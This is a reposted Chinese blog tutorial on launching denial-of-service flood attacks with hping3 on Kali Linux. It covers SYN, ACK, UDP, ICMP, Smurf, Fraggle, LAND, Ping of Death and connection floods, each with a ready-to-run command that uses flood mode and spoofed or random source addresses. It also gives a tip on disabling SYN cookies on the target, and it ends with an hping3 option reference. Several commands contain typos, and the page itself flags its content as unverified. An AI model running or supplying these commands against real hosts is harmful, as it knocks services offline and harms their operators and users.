---
# 文章标题
title: 【转载】使用 Kali 进行 Flood 攻击
# 当前页面的短标题，会在导航栏、侧边栏和路径导航中作为首选。
shortTitle: 使用 Kali 进行 Flood 攻击
# 当前页面内容描述。
description: 使用 Kali 进行 Flood 攻击
# 当前页面的图标，建议填写
icon: "/assets/blogicons/Kali.png"
# 作者
author: 昌霖学长
# 当前文章是否为原创
isOriginal: false
# 设置写作时间
date: 2024-08-01
# 分类，一个页面可以有多个分类
categories: 
  - 网络安全
  - Kali
# 标签，一个页面可以有多个标签
tags: 
  - Kali
  - Flood 攻击
# 页面的协议信息
license: MIT
# 置顶标记（true/false/数字），当填入数字时，数字越大，排名越靠前。
sticky: false
# 星标（true/false/数字），当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中。
article: true
# 是否将该文章添加至时间线中。
timeline: true
# 是否开启评论
comment: false
# 预览图。请填入绝对路径。图片路径位于 .vuepress/public 下
# cover: /assets/images/cover1.jpg
# 设置横幅图片 (宽屏分享图)，请填入绝对路径。
# banner: /assets/images/cover1.jpg
---

::: danger
本文内容还需要进一步确认和修正。
:::

::: important 转载说明

原文链接：https://blog.csdn.net/Refrain_mh/article/details/121161824

版权声明：本文为 CSDN 博主「重启艺术大师」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。

:::

::: details TCP SYN Flood
    
TCP-SYN Flood 攻击又称半开式连接攻击，每当我们进行一次标准的 TCP 连接，都会有一个三次握手的过程，而 TCP-SYN Flood 在它的实现过程中只有前两个步骤。这样，服务方会在一定时间处于等待接收请求方 ASK 消息的状态。由于一台终端可用的 TCP 连接是有限的，如果恶意攻击方快速连续地发送此类连接请求，则终端可用 TCP 连接队列很快将会阻塞，系统资源和可用带宽急剧下降，无法提供正常的网络服务，从而造成拒绝服务。
    
```bash
hping3 -a 100.37.1.2 -d 120 -S -w 64 -p 80 --flood 10.35.1.80 
-c 1000 # 发送的数据包的数量。 
-d 120 # 发送到目标机器的每个数据包的大小。单位是字节 
-S # 只发送 SYN 数据包。 
-w 64 # TCP 窗口大小。 
-p 80 # 目的地端口(80 是 WEB 端口)。你在这里可以使用任何端口。 
--flood # 尽可能快地发送数据包，不需要考虑显示入站回复。洪水攻击模式。 
--rand-source # 使用随机性的源头 IP 地址。这里的伪造的 IP 地址，只是在局域中伪造。通过路由器后，还会还原成真实的 IP 地址。 

# 如果攻击CentOS效果不明显可以先关闭CentOS中的TCP_SYNCookies 
echo 0 > /proc/sys/net/ipv4/tcp_syncookies 
# 该选项默认值是1，即启用syn cookies功能，此功能能够有效地防止syn flood攻击。
```

:::

::: details TCP ACK Flood

对于短时间内向目标发送大量的的 TCP 数据包，在处理每一个数据包的时候资源消耗殆尽导致拒绝服务。

```bash
hping3 -c 20000 -d 120 -A -w 64 -p 80 --flood --rand-source <目标IP>
```

:::

::: details TCP Syn-Ack Flood

SYN-ACK Flood 攻击正是利用了这一点，攻击者利用工具或者操纵僵尸主机，向目标终端发送大量的 SYN-ACK 报文，这些报文都属于凭空出现的第二次握手报文，终端忙于回复 RST 报文，导致资源耗尽，无法响应正常的请求。

```bash
hping3 -q -n -a <源ip> -S -s 1134 --keep -p 515 -i --faster -c 100 <目标ip>
```

:::

::: details Data ack and push flood

当与终端连接时，客户端可以通过设置 ACK 标志来请求确认已接收到信息，或者它可以通过设置 PUSH 标志强制终端处理数据包中的信息。这两个请求都要求终端执行比其他类型的请求更多的工作。

```bash
hping3 --flood --rand-source -PA -p PORT <目标ip>
```

:::

::: details UDP Flood

UDP 洪泛是一种拒绝服务攻击，其中大量的用户数据报协议（UDP）数据包被发送到目标终端，目的是压倒该设备的处理和响应能力。

```bash
hping3 -c 50000 -d 120 --udp -w 64 -p port --flood --rand-source <目标IP>
```

:::

::: details ICMP Flood

ICMP（Internet Control Message Protocol–Internet 控制消息协议）是网络层的协议类似于 UDP。ICMP 递送状态消息，错误报告，回答某些请求，报告路由信息，并且常用于测试网络的连通性和排查问题。

ICMP Floods 类似于 UDP 不需要任何漏洞，只需要发送大量的 ICMP 数据包，在处理每一个数据包的时候资源消耗殆尽导致拒绝服务。

```bash
hping3 -c 10000 -d 120 --icmp -w 64 -p port --flood --rand-sourcet <目标IP>
```

:::

::: details ICMP-Echo flood

ICMP-Echo flooding 是指发送大量 ICMP Echo 数据包。这些数据包具有源 IP（通常被欺骗以减少 IP 信誉机制的影响）和受害者的目标 IP。

```bash
hping3 -c 10000 -d 120 --icmp -C 0 -w 64 -p 80 --flood --rand-sourcet <目标IP>
```

:::

::: details 特殊标志位的 DoS 攻击

FIN -F RST -F ACK -A SYN -S

**设置 FIN 和 RST 标志位的 dos 攻击**

正常情况下，FIN 标志和 RST 标志是不能同时出现在一个 TCP 报文中的。而且 RFC 也没有规定 IP 协议栈如何处理这样的畸形报文，因此，各个操作系统的协议栈在收到这样的报文后的处理方式也不同，攻击者就可以利用这个特征，通过发送 FIN 和 RST 同时设置的报文，来判断操作系统的类型，然后针对该操作系统，进行进一步的攻击。

```bash
hping3 -c 10000 -d 120 -F -R -w 64 -p 80 --flood --rand-source <目标IP>
```

**设置 ACK 和 RST 标志位的 dos 攻击。**

正常情况下，ACK 标志和 RST 标志是不能同时出现在一个 TCP 报文中的。而且 RFC 也没有规定 IP 协议栈如何处理这样的畸形报文，因此，各个操作系统的协议栈在收到这样的报文后的处理方式也不同，攻击者就可以利用这个特征，通过发送 ACK 和 RST 同时设置的报文，来判断操作系统的类型，然后针对该操作系统，进行进一步的攻击。

```bash
hping3 -c 10000 -d 120 -A —R -w 64 -p 80 --flood --rand-source <目标IP>
```

:::

::: details TCP 连接攻击

Connection Flood 是典型的并且非常的有效的利用小流量冲击大带宽网络服务的攻击方式，这种攻击方式目前已经越来越猖獗。这种攻击的原理是利用真实的 IP 地址向终端发起大量的连接，并且建立连接之后很长时间不释放，占用终端的资源，造成终端终端上残余连接 (WAIT 状态) 过多，效率降低，甚至资源耗尽，无法响应其他客户所发起的连接。

其中一种攻击方法是每秒钟向终端发起大量的连接请求，这类似于固定源 IP 的 SYN Flood 攻击，不同的是采用了真实的源 IP 地址。通常这可以在防火墙上限制每个源 IP 地址每秒钟的连接数来达到防护目的。但现在已有工具采用慢速连接的方式，也即几秒钟才和终端建立一个连接，连接建立成功之后并不释放并定时发送垃圾数据包给终端使连接得以长时间保持。这样一个 IP 地址就可以和终端建立成百上千的连接，而终端可以承受的连接数是有限的，这就达到了拒绝服务的效果

```bash
hping3 --tcp-connect --rate=90000 -c 900000 -q <目标IP>
```

:::

::: details Large Ping

ICMP（Internet Control Message Protocol–Internet 控制消息协议）和 IGMP（Internet Group Management Protocol–Internet 组管理协议）是网络层的协议类似于 UDP。ICMP 递送状态消息，错误报告，回答某些请求，报告路由信息，并且常用于测试网络的连通性和排查问题。IGMP 是 IP 网络上的系统和相邻路由用来建立和维护多播组成员关系的协议。

ICMP and IGMP Floods 类似于 UDP 不需要任何漏洞，只需要发送大量的 ICMP 或 IGMP 数据包，在处理每一个数据包的时候资源消耗殆尽导致拒绝服务。

```bash
hping3 -d 501 --flood --rand-source -1 -p PORT <目标IP>
```

:::

::: details 固定源 ICMP 攻击

伪装 IP 攻击

```bash
hping3 -1 -a 伪装IP 目标IP
```

:::

::: details Ping of Death

Ping of death 是一种拒绝服务攻击，方法是由攻击者故意发送大于 65536 比特的 ip 数据包给对方。Ping of death 攻击利用了 Internet 控制消息协议 (ICMP) 和最大传输单元 (MTU) 的特点，Ping 命令发送 ICMP 回应请求 (ICMP Echo-Request) 并记录收到 ICMP 回应回复 (ICMP Echo-Reply)。MTU 定义了具有不同媒体类型的网络架构的单元最大传输量。

如果数据包大小大于MTU，数据包将被拆分，并在目的主机重新组合。当数据包被分解时，数据包会涵盖一个“偏移”值，这个偏移值用于在目的主机重组数据。攻击者可以将最后的数据片段替换为合理的偏移值和较大的数据包，这样将会超过ICMP回应请求数据部分的数量，如果进行重组，目的计算机将会重新启动或者崩溃。

```bash
hping3 -1 -d 70000 -c 1 <目标ip>
```

:::

::: details 源端口为 0**

访问 UDP/TCP 的 0 端口导致该事件的产生，这是一个不正常的访问，暗示着非授权的网络访问或探测活动。

```bash
hping3 -c 10000 -d 120 --tcp -w 64 -p 0 --flood --rand-source +host <目标IP>
    
hping3 -c 10000 -d 120 --udp -w 64 -p 0 --flood --rand-source +host <目标IP>
```

:::

::: details ICMP-Smurf attack

ICMP/SMURF 攻击利用的是网络广播的原理来发送大量的连接, 而包的源地址就是要攻击的机器本身的地址; 因而所有接收到此包的主机都将给包的源地址发送一个 ICMP 回复包。

```bash
hping3 -1 -a 192.168.0.1 192.168.0.255

hping3 -1 -a 目标ip 目标服务器广播地址
```

:::

::: details TCP-Land Attack

着陆攻击 LAND Attack 也是一种拒绝服务攻击 DOS。LAND 是 Local Area Network Denial 的缩写，意思是局域网拒绝服务攻击，翻译为着陆攻击只是一种错误的理解。攻击原理为，攻击机向目标机发送一个 SYN 的 TCP 包，包中的源地址被伪造为目标机的地址。当目标机收到包后，会向自己发送一个 SYN+ACK 的 TCP 包。然后，目标机向自己发送一个 ACK 包，这样就自己和自己建立一个空连接。这个空连接会一直持续，直到超时。当目标机被这样大量欺骗，建立大量空连接，消耗大量的系统资源，导致系统运行缓慢，甚至崩溃。

```bash
hping3 -S -c 1000000 -a <源IP> -p port <目标IP>
```

:::

::: details Fraggle Attack

Fraggle 攻击对 Smurf 攻击作了简单的修改，使用的是 UDP 应答消息而非 ICMP。

```bash
hping3 -2 -a 目标ip 目标服务器广播地址

hping3 -2 -a 192.168.0.1 192.168.0.255
```

:::

::: details hping3 的其他参数用法

### 用法

`-h` `--help` 显示帮助

`-v` `--version` 显示版本

`-c` `--count` 发送数据包的数目

`-i` `--interval` 发送数据包间隔的时间 (uX即X微秒,例如：-i u1000)

`--fast` 等同 `-i u10000`(每秒10个包) 

`--faster` 等同 `-i u1000`(每秒100个包) 

`--flood` 尽最快发送数据包，不显示回复。 

`1 2 3 -n --numeric` 数字化输出，象征性输出主机地址。

`-q` `--quiet` 安静模式

`-I` `--interface` 网卡接口 (默认路由接口)

`-V` `--verbose` 详细模式

`-D` `--debug` 调试信息

`-z` `--bind` 绑定ctrl+z到ttl(默认为目的端口)

`-Z` `--unbind` 取消绑定ctrl+z键

`–beep` 对于接收到的每个匹配数据包蜂鸣声提示

### 模式选择

default mode TCP // 默认模式是 TCP

-0 --rawip RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。

-1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用–ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。

-2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用–baseport --destport --keep选项指定其模式。

-8 --scan SCAN mode. //扫描模式 指定扫描对应的端口。

Example: hping --scan 1-30,70-90 -S [www.target.host](http://www.target.host/) // 扫描

-9 --listen listen mode // 监听模式

- **IP 模式**

    -a --spoof spoof source address //源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。

    –rand-dest random destionation address mode. see the man. // 随机目的地址模式。详细使用 man 命令

    –rand-source random source address mode. see the man. // 随机源地址模式。详细使用 man 命令

    -t --ttl ttl (默认 64) //修改 ttl 值

    -N --id id (默认 随机) // hping 中的 ID 值，缺省为随机值

    -W --winid 使用win* id字节顺序 //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。

    -r --rel 相对id字段(估计主机流量) //更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。

    -f --frag 拆分数据包更多的frag. (may pass weak acl) //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。

    -x --morefrag 设置更多的分段标志 // 大量碎片，泪滴攻击。

    -y --dontfrag 设置不分段标志 // 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。

    -g --fragoff set the fragment offset // 设置断偏移。

    -m --mtu 设置虚拟最大传输单元, implies –frag if packet size > mtu // 设置虚拟MTU值，当大于mtu的时候分段。

    -o --tos type of service (default 0x00), try –tos help // tos字段，缺省0x00，尽力而为？

    -G --rroute includes RECORD_ROUTE option and display the route buffer // 记录IP路由，并显示路由缓冲。

    –lsrr 松散源路由并记录路由 // 松散源路由

    –ssrr 严格源路由并记录路由 // 严格源路由

    -H --ipproto 设置IP协议字段，仅在RAW IP模式下使用 //在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。

- **ICMP 模式**

    -C --icmptype icmp类型(默认echo请求) // ICMP类型，缺省回显请求。

    -K --icmpcode icmp代号(默认0) // ICMP代码。

    –force-icmp 发送所有icmp类型(默认仅发送支持的类型) // 强制ICMP类型。

    –icmp-gw 设置ICMP重定向网关地址(默认0.0.0.0) // ICMP重定向

    –icmp-ts 等同 –icmp --icmptype 13 (ICMP 时间戳) // icmp时间戳

    –icmp-addr 等同 –icmp --icmptype 17 (ICMP 地址子网掩码) // icmp子网地址

    –icmp-help 显示其他icmp选项帮助 // ICMP帮助

- **UDP/TCP 模式**

    -s --baseport base source port (default random) // 缺省随机源端口

    -p --destport [+][+] destination port(default 0) ctrl+z inc/dec // 缺省随机源端口

    -k --keep keep still source port // 保持源端口

    -w --win winsize (default 64) // win的滑动窗口。windows发送字节(默认64)

    -O --tcpoff set fake tcp data offset (instead of tcphdrlen / 4) // 设置伪造tcp数据偏移量(取代tcp地址长度除4)

    -Q --seqnum shows only tcp sequence number // 仅显示tcp序列号

    -b --badcksum (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。

    -M --setseq 设置TCP序列号

    -L --setack 设置TCP的ack ------------------------------------- (不是 TCP 的 ACK 标志位)

    -F --fin set FIN flag

    -S --syn set SYN flag

    -R --rst set RST flag

    -P --push set PUSH flag

    -A --ack set ACK flag ------------------------------------- （设置 TCP 的 ACK 标志 位）

    -U --urg set URG flag // 一大堆IP抱头的设置。

    -X --xmas set X unused flag (0x40)

    -Y --ymas set Y unused flag (0x80)

    –tcpexitcode 使用last tcp-> th_flags作为退出码

    –tcp-mss 启用具有给定值的TCP MSS选项

    –tcp-timestamp 启用 TCP 时间戳选项来猜测 HZ/uptime

:::
